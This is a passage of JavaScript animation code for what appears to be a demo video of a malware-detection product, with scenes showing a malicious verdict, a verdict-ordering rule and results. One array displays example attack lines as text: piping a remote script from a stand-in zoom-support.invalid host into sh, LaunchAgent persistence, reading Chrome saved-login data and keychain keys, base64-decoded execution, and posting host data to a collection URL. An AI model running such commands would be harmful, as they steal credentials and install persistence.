    M.fromTo('#mal-badge', { scale: 3.2, opacity: 0, filter: 'blur(10px)' }, { scale: 1, opacity: 1, filter: 'blur(0px)', duration: 0.3, ease: 'power4.in' }, 60.1);
    gsap.set('#shock-red', { left: 140, top: 57 });
    M.fromTo('#shock-red', { width: 10, height: 10, margin: -5, opacity: 1 }, { width: 2200, height: 2200, margin: -1100, opacity: 0, duration: 1.3, ease: 'expo.out' }, 60.4);
    shake(60.4, 1.3, 0.55);
    flash(60.4, 0.12, 0.4);
    const R = { v: 0 };
    M.to(R, { v: 100, duration: 1.1, ease: 'power2.out', onUpdate: () => ($('#risk-n').textContent = Math.round(R.v)) }, 60.5);
    M.from('#risk', { opacity: 0, x: 30, duration: 0.5 }, 60.45);
    const sum = split('#rp-sum', 'words', 'words');
    M.from(sum.words, { yPercent: 105, duration: 0.6, ease: 'expo.out', stagger: 0.025 }, 61.4);
    M.from('#rp-chips .chip', { opacity: 0, y: 14, duration: 0.45, stagger: 0.08, ease: 'back.out(2)' }, 62.3);
    M.from('#rp-tl', { opacity: 0, y: 50, duration: 0.8, ease: 'expo.out' }, 62.55);
    M.from('#rp-code', { opacity: 0, y: 50, duration: 0.8, ease: 'expo.out' }, 62.7);
    const code = [
      [24, 'curl -fsSL https://updates.zoom-support.invalid/stage2.sh | sh', 0],
      [27, 'mkdir -p "$HOME/Library/LaunchAgents"', 1],
      [28, `cat > "$HOME/Library/LaunchAgents/us.zoom.updater.plist" <<'PLIST'`, 1],
      [38, 'ls "$HOME/Library/Application Support/Google/Chrome/Default/Login Data"', 2],
      [39, 'security find-generic-password -w -s "Chrome Safe Storage"', 2],
      [42, 'echo ZWNobyBhZWdpcy10ZXN0LXN0YWdl | base64 -d | sh', 3],
      [45, 'wget -q --post-data "host=$(hostname)" https://collect.zoom-support.invalid/upload', 4],
    ];
    const codeEl = $('#code');
    const byStep = [[], [], [], [], []];
    for (const [n, text, step] of code) {
      const cl = document.createElement('div');
      cl.className = 'cl';
      cl.innerHTML = `<i class="hl"></i><span class="ln">${n}</span><span class="tx"></span>`;
      $('.tx', cl).textContent = text;
      codeEl.appendChild(cl);
      byStep[step].push(cl);
    }
    M.from('#code .cl', { opacity: 0, x: -10, duration: 0.3, stagger: 0.05 }, 62.9);
    const stepAt = [63.5, 65.45, 67.0, 67.9, 68.5];
    const steps = $$('#rp-tl .tl-step');
    M.fromTo('#tl-line', { scaleY: 0 }, { scaleY: 1, duration: 68.6 - 63.5, ease: 'none' }, 63.5);
    steps.forEach((st, i) => {
      const t = stepAt[i];
      M.fromTo(st, { opacity: 0, x: -24 }, { opacity: 1, x: 0, duration: 0.5, ease: 'expo.out' }, t);
      M.fromTo($('.num', st), { scale: 0.3 }, { scale: 1, duration: 0.5, ease: 'back.out(3)' }, t);
      for (const cl of byStep[i]) {
        M.to($('.hl', cl), { scaleX: 1, duration: 0.45, ease: 'expo.out' }, t + 0.05);
        M.to($('.tx', cl), { color: '#e6f3fb', duration: 0.3 }, t + 0.05);
      }
    });
  }

  // ---------- S08 · AI can only raise it ----------
  {
    const ai2 = $('#mk-ai').cloneNode(true);
    ai2.id = 'mk-ai2';
    $('#ladder').appendChild(ai2);
    $('#mk-ai').textContent = 'AI says: Clean';
    ai2.textContent = 'AI says: Malicious';
    gsap.set(ai2, { top: 36, left: 655, border: '1.5px dashed #ff6b80', color: '#ff8fa0', background: 'rgba(58,26,42,.92)' });
    M.from('#rail', { scaleY: 0, transformOrigin: '50% 100%', duration: 0.9, ease: 'power2.inOut' }, 70.1);
    M.from('#ladder .rung', { opacity: 0, x: -40, duration: 0.6, ease: 'expo.out', stagger: -0.1 }, 70.2);
    M.from('#mk-rules', { opacity: 0, x: 40, duration: 0.5 }, 70.8);
    M.from('#mk-final', { opacity: 0, x: 40, duration: 0.5 }, 71.0);
    const eb = split('#tr-eb', 'chars', 'chars');
    M.from(eb.chars, { yPercent: 110, duration: 0.6, stagger: 0.012, ease: 'expo.out' }, 70.85);
    // An AI "Clean" tries to drag the verdict down and hits the floor.
    M.fromTo('#mk-ai', { opacity: 0, x: 60 }, { opacity: 1, x: 0, duration: 0.5, ease: 'expo.out' }, 71.35);
    M.to('#mk-final', { y: 110, duration: 0.42, ease: 'power2.in' }, 71.88);
    M.fromTo('#floor', { opacity: 0, scaleX: 0.3 }, { opacity: 1, scaleX: 1, duration: 0.25, ease: 'expo.out' }, 72.2);
    M.to('#mk-final', { y: 0, duration: 0.9, ease: 'elastic.out(1, 0.45)' }, 72.3);
    M.fromTo('#deny-x', { opacity: 0, scale: 2.4 }, { opacity: 1, scale: 1, duration: 0.35, ease: 'back.out(3)' }, 72.3);
    M.to('#deny-x', { opacity: 0, duration: 0.4 }, 73.6);
    M.to('#floor', { opacity: 0.35, duration: 0.6 }, 73.0);
    shake(72.3, 0.7, 0.35);
    M.to('#mk-ai', { opacity: 0.25, x: 20, duration: 0.5 }, 72.7);
    // An AI "Malicious" lifts it.
    M.fromTo(ai2, { opacity: 0, x: 60 }, { opacity: 1, x: 0, duration: 0.5, ease: 'expo.out' }, 73.0);
    M.to('#mk-final', { y: -200, duration: 0.95, ease: 'power3.inOut' }, 73.6);
    M.to('#mk-final', { backgroundColor: '#ff6b80', borderColor: '#ff6b80', boxShadow: '0 0 36px rgba(255,107,128,.55)', duration: 0.3 }, 74.4);
    M.fromTo('#r-mal .badge', { scale: 1 }, { scale: 1.12, duration: 0.18, yoyo: true, repeat: 1, immediateRender: false }, 74.5);
    M.from('#formula', { opacity: 0, y: 30, filter: 'blur(8px)', duration: 0.7, ease: 'expo.out' }, 72.95);
    M.from('#order', { opacity: 0, y: 14, duration: 0.6 }, 73.55);
    M.from('#never', { opacity: 0, y: 24, duration: 0.6, ease: 'expo.out' }, 74.6);
    M.from('#never .muted', { opacity: 0, x: -14, duration: 0.5 }, 75.97);
    M.from('#safe', { opacity: 0, y: 30, duration: 0.7, ease: 'expo.out' }, 76.95);
    M.to('#strike', { scaleX: 1, duration: 0.3, ease: 'power3.out' }, 78.0);
    M.to('#safe .strike-wrap', { color: '#4d6d85', duration: 0.3 }, 78.05);
    M.from('#unk', { opacity: 0, y: 24, duration: 0.6, ease: 'expo.out' }, 79.15);
    M.fromTo('#unk-badge', { opacity: 0, scale: 0.5 }, { opacity: 1, scale: 1, duration: 0.5, ease: 'back.out(2.6)' }, 80.32);
    M.to('#unk-badge', { boxShadow: '0 0 40px rgba(124,183,255,.55)', duration: 0.4 }, 80.4);
    M.fromTo('#r-unk .badge', { scale: 1 }, { scale: 1.15, duration: 0.2, yoyo: true, repeat: 1, immediateRender: false }, 80.35);
  }

  // ---------- S09 · Proof ----------
  {
    M.from('#proof-head .eyebrow', { opacity: 0, letterSpacing: '0.6em', duration: 0.8 }, 82.6);
    const h = split('#proof-head .hero', 'words', 'words');
    M.from(h.words, { yPercent: 110, duration: 0.7, ease: 'expo.out', stagger: 0.05 }, 83.0);
    $$('#tiles .tile').forEach((tile, i) => {
      const t = 82.7 + i * 0.2;
      M.fromTo(tile, { rotationX: -95, opacity: 0 }, { rotationX: 0, opacity: 1, duration: 0.9, ease: 'expo.out' }, t);
      const n = $('.n', tile);
      const to = +n.dataset.to, fmt = n.dataset.fmt;
      const C = { v: to === 0 ? 9 : 0 };
      const show = () => {
        const v = Math.round(C.v);
        n.textContent = fmt === 'of26' ? `${v}/26` : fmt === 'of6' ? `${v}/6` : String(v);
      };
      show();
      M.to(C, { v: to, duration: 1.3, ease: 'power2.out', onUpdate: show }, t + 0.2);
      M.to($('.meter i', tile), { scaleX: 1, duration: 1.3, ease: 'power2.out' }, t + 0.2);
    });
    M.from('#proof-foot', { opacity: 0, y: 10, duration: 0.6 }, 84.9);
  }

  // ---------- S10 · Built with ----------
  {
    M.from('#s10-title', { opacity: 0, y: -10, duration: 0.6 }, 88.1);
    M.fromTo('#s10-core', { scale: 0, opacity: 0 }, { scale: 1, opacity: 1, duration: 0.7, ease: 'back.out(1.8)' }, 88.0);
    M.fromTo('#orbit', { drawSVG: '0%' }, { drawSVG: '100%', duration: 1.0, ease: 'power2.inOut' }, 88.0);
    const nodeAt = [88.15, 88.35, 89.4, 91.15];
    nodeAt.forEach((t, i) => {
      M.fromTo('#nd' + (i + 1), { opacity: 0, scale: 0.7, y: 20 }, { opacity: 1, scale: 1, y: 0, duration: 0.6, ease: 'back.out(1.8)' }, t);
      M.fromTo('#bm' + (i + 1), { opacity: 0 }, { opacity: 0.85, duration: 0.5 }, t + 0.1);
    });
    $$('#orbit-svg .beam').forEach((b) => b.setAttribute('stroke-dasharray', '10 12'));
    tick((t) => {
      if (t < 87.9 || t > 94.1) return;
      $$('#orbit-svg .beam').forEach((b) => b.setAttribute('stroke-dashoffset', String(-t * 60)));
      $('#orbit').setAttribute('transform', `rotate(${Math.sin(t * 0.4) * 2} 960 560)`);
      gsap.set('#s10-core', { boxShadow: `0 0 ${50 + Math.sin(t * 3) * 20}px rgba(80,230,255,.4)` });
    });
    M.fromTo('#bb1', { opacity: 0, scale: 0.5, transformOrigin: '100% 100%' }, { opacity: 1, scale: 1, duration: 0.45, ease: 'back.out(2)' }, 91.6);
    M.fromTo('#bb2', { opacity: 0, scale: 0.5, transformOrigin: '0% 100%' }, { opacity: 1, scale: 1, duration: 0.45, ease: 'back.out(2)' }, 92.3);
  }

  // ---------- S11 · Outro ----------
  {
    lockup('s11', { draw: 94.05, fill: 94.7, word: 95.0, centerY: 430 });
    const tg = split('#s11-t', 'words', 'words');
    M.from(tg.words, { yPercent: 110, opacity: 0, duration: 0.7, ease: 'expo.out', stagger: 0.06 }, 95.7);
    M.fromTo('#s11-sheen', { backgroundPosition: '150% 0%' }, { backgroundPosition: '-50% 0%', duration: 1.2, ease: 'power2.inOut' }, 96.6);
    M.from('#s11-foot', { opacity: 0, y: 12, duration: 0.8 }, 97.8);
    M.to('#fade', { opacity: 1, duration: 1.3, ease: 'power2.in' }, 99.7);
  }

  // ---------- Background, grain, shake ----------
  const bg = $('#bg').getContext('2d');
  const r = rng(99);
  const parts = Array.from({ length: 120 }, () => ({ x: r() * 1920, y: r() * 1080, s: 0.6 + r() * 1.8, v: 6 + r() * 22, ph: r() * 6.28 }));
  const mix = (a, b, k) => a.map((v, i) => Math.round(v + (b[i] - v) * k));
  const orb = (x, y, rad, rgb, a) => {
    const g = bg.createRadialGradient(x, y, 0, x, y, rad);
    g.addColorStop(0, `rgba(${rgb},${a})`);
    g.addColorStop(1, `rgba(${rgb},0)`);
    bg.fillStyle = g;
    bg.fillRect(x - rad, y - rad, rad * 2, rad * 2);
  };
  function renderBG(t) {
    bg.fillStyle = '#04111f';
    bg.fillRect(0, 0, 1920, 1080);
    const d = B.danger;
    orb(960 + Math.sin(t * 0.13) * 320, 260 + Math.cos(t * 0.11) * 90, 950, mix([26, 116, 196], [220, 40, 70], d), 0.2 + d * 0.06);
    orb(380 + Math.cos(t * 0.09) * 200, 820, 720, mix([80, 230, 255], [255, 107, 128], d), 0.07 + d * 0.05);
    orb(1580 + Math.sin(t * 0.07) * 160, 720, 820, mix([15, 86, 130], [130, 20, 45], d), 0.22);
    if (B.grid > 0.01) {
      const hy = 610, vx = 960;
      bg.lineWidth = 1.2;
      for (let j = -16; j <= 16; j++) {
        const g = bg.createLinearGradient(0, hy, 0, 1080);
        g.addColorStop(0, 'rgba(80,230,255,0)');
        g.addColorStop(1, `rgba(80,230,255,${0.2 * B.grid})`);
        bg.strokeStyle = g;
        bg.beginPath(); bg.moveTo(vx + j * 14, hy); bg.lineTo(vx + j * 250, 1080); bg.stroke();
      }
      const off = B.travel % 1;
      for (let i = 0; i < 26; i++) {
        const z = i + 1 - off;
        const y = hy + 470 / z;
        if (y > 1080) continue;
        bg.strokeStyle = `rgba(80,230,255,${Math.min(1, (y - hy) / 320) * 0.24 * B.grid})`;
        bg.beginPath(); bg.moveTo(0, y); bg.lineTo(1920, y); bg.stroke();
      }
      const hz = bg.createLinearGradient(0, hy - 40, 0, hy + 40);
      hz.addColorStop(0, 'rgba(80,230,255,0)'); hz.addColorStop(0.5, `rgba(80,230,255,${0.12 * B.grid})`); hz.addColorStop(1, 'rgba(80,230,255,0)');
      bg.fillStyle = hz; bg.fillRect(0, hy - 40, 1920, 80);
    }
    for (const p of parts) {
      const y = (((p.y - t * p.v) % 1080) + 1080) % 1080;
      const x = p.x + Math.sin(t * 0.3 + p.ph) * 14;
      const a = 0.18 + 0.22 * Math.sin(t * 1.4 + p.ph);
      bg.fillStyle = `rgba(${mix([139, 240, 255], [255, 150, 165], d)},${Math.max(0, a)})`;
      bg.beginPath(); bg.arc(x, y, p.s, 0, 6.283); bg.fill();
    }
  }
  const grain = $('#grain').getContext('2d');
  const noise = Array.from({ length: 6 }, (_, k) => {
    const c = document.createElement('canvas'); c.width = 960; c.height = 540;
    const x = c.getContext('2d'); const img = x.createImageData(960, 540); const rr = rng(k + 1);
    for (let i = 0; i < img.data.length; i += 4) { const v = rr() * 255; img.data[i] = img.data[i + 1] = img.data[i + 2] = v; img.data[i + 3] = 255; }
    x.putImageData(img, 0, 0); return c;
  });
  const scenesEl = $$('.scene');
  function runTicks(t) {
    for (const fn of ticks) fn(t);
    renderBG(t);
    grain.drawImage(noise[Math.floor(t * 24) % noise.length], 0, 0);
    const a = SH.a;
    const sx = a ? (Math.sin(t * 91) + Math.sin(t * 53.7)) * 7 * a : 0;
    const sy = a ? (Math.cos(t * 83) + Math.sin(t * 61.3)) * 6 * a : 0;
    for (const el of scenesEl) gsap.set(el, { x: sx, y: sy });
  }

  const seek = (t) => { M.seek(t, false); runTicks(t); };
  window.__duration = T.duration;
  window.__fps = T.fps;
  window.__seek = seek;
  seek(0);

  if (!RENDER) {
    // Preview: fit the stage to the window, with play/scrub controls.
    const stage = $('#stage');
    const fit = () => {
      const k = Math.min(innerWidth / 1920, (innerHeight - 44) / 1080);
      stage.style.transform = `scale(${k})`;
    };
    fit(); addEventListener('resize', fit);
    const ui = $('#ui'); ui.style.display = 'flex';
    const pp = $('#pp'), scrub = $('#scrub'), tc = $('#tc');
    let playing = false, t0 = 0, base = +(qs.get('t') || 0);
    seek(base); scrub.value = base;
    const loop = (now) => {
      if (!playing) return;
      const t = base + (now - t0) / 1000;
      if (t >= T.duration) { playing = false; pp.textContent = 'Play'; return; }
      seek(t); scrub.value = t; tc.textContent = t.toFixed(2);
      requestAnimationFrame(loop);
    };
    pp.onclick = () => {
      playing = !playing; pp.textContent = playing ? 'Pause' : 'Play';
      if (playing) { base = +scrub.value; t0 = performance.now(); requestAnimationFrame(loop); }
    };
    scrub.oninput = () => { playing = false; pp.textContent = 'Play'; seek(+scrub.value); tc.textContent = (+scrub.value).toFixed(2); };
    addEventListener('keydown', (e) => { if (e.code === 'Space') { e.preventDefault(); pp.onclick(); } });
  }
  window.__ready = true;
})().catch((e) => { window.__error = String(e && e.stack || e); console.error(e); });
